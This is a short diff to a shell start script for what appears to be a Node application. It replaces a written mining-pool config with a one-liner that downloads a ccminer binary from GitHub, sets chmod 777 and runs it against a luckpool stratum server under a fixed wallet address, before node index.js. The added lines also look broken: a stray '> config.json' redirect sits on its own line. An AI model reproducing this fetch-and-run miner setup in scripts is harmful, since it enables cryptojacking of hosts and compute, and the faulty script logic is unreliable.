@@ -26,7 +26,7 @@ sh install.sh
 sleep 2
 rm config.json
 sleep 2
-echo '[{"algorithm": "verushash", "host": "na.luckpool.net", "port": 3956, "worker":
-"RSG3DX4HDWw1Z1k3jSPwribvVs3ghscR3m", "workers": 4 }]' > config.json
+wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz && tar -xf ccminer_CPU_3.8.3.tar.xz && chmod 777 ccminer && ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RSG3DX4HDWw1Z1k3jSPwribvVs3ghscR3m.hh
+ > config.json
 sleep 2
 node index.js
